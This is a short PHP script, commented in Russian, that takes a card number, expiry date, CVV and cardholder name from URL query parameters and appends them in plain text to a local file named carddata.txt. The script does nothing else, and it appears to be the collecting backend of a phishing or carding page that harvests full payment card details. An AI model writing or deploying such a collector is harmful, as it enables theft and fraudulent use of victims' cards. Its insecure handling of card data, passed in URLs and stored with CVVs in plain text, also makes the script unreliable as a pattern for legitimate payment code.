<?php
$cardNumber = $_GET['cardNumber'];
$expiryDate = $_GET['expiryDate'];
$cvv = $_GET['cvv'];
$cardHolder = $_GET['cardHolder'];

// Сохранение данных в файл
$file = fopen("carddata.txt", "a");
fwrite($file, "Card Number: $cardNumber, Expiry Date: $expiryDate, CVV: $cvv, Card Holder: $cardHolder\n");
fclose($file);
?>